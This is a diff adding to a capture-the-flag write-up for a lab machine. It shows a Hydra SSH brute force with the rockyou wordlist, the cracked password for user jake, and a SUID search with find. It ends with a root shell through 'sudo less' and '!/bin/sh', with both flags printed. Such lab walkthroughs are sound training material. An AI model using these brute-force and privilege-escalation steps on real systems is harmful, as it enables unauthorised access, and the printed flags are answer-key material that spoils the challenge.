@@ -37,6 +37,8 @@ PING brooklyn.thm (10.10.218.233) 56(84) bytes of data.
 64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=3 ttl=63 time=60.6 ms
 ```
 
+Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.
+
 #### Task 2 - Find the User flag
 
 ```bash
@@ -177,11 +179,115 @@ From Amy,
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 ```
 
-it's another good indication for us
+it's another great indication, we know that there's a user: Jake with a weak password.
 
+We use brute force tool: Hydra with parameters: Jake and dictionary (rockyou).
 
+```bash
+hydra -l jake -P /usr/share/wordlists/rockyou.txt brooklyn.thm ssh
+```
+
+```bash
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-24 05:56:00
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://brooklyn.thm:22/
+[22][ssh] host: brooklyn.thm   login: jake   password: 987654321
+```
+
+{% hint style="info" %}
+jake::987654321
+{% endhint %}
+
+We can use the credentials obtained for ssh access:
+
+```bash
+ssh jake@brooklyn.thm
+jake@brooklyn.thm's password: 
+Last login: Tue May 26 08:56:58 2020
+```
+
+```bash
+jake@brookly_nine_nine:~$ pwd
+/home/jake
+jake@brookly_nine_nine:~$ whoami
+jake
+jake@brookly_nine_nine:~$ ls
+jake@brookly_nine_nine:~$ cd ..
+jake@brookly_nine_nine:/home$ ls
+amy  holt  jake
+jake@brookly_nine_nine:/home$ cd holt
+jake@brookly_nine_nine:/home/holt$ ls
+nano.save  user.txt
+jake@brookly_nine_nine:/home/holt$ cat user.txt
+```
+
+<details>
+
+<summary>🚩 Flag 1 (user.txt)</summary>
+
+ee11cbb19052e40b07aac0ca060c23ee
+
+</details>
 
 #### Task 3 - Find the Root flag
 
+Now, we need to get root permissions to explore the root folder.
 
+We can use the following command to list SUID files or sudo -l command:
 
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+```bash
+find: ‘/run/systemd/unit-root’: Permission denied
+find: ‘/run/systemd/inaccessible’: Permission denied
+find: ‘/run/lock/lvm’: Permission denied
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+
+-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 170760 Dec  1  2017 /bin/less
+-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
+```
+
+/bin/less stands out, We can use script of this website to became a root, in this case we choose less process: [https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)
+
+```bash
+sudo less /etc/profile
+!/bin/sh
+```
+
+```bash
+jake@brookly_nine_nine:/$ sudo less /etc/profile
+# whoami
+root
+```
+
+Now, we're root!
+
+```bash
+# ls
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
+# cd root
+# ls
+root.txt
+# cat root.txt
+```
+
+<details>
+
+<summary>🚩 Flag 2 (root.txt)</summary>
+
+63a9f0ea7bb98050796b649e85481845
+
+</details>
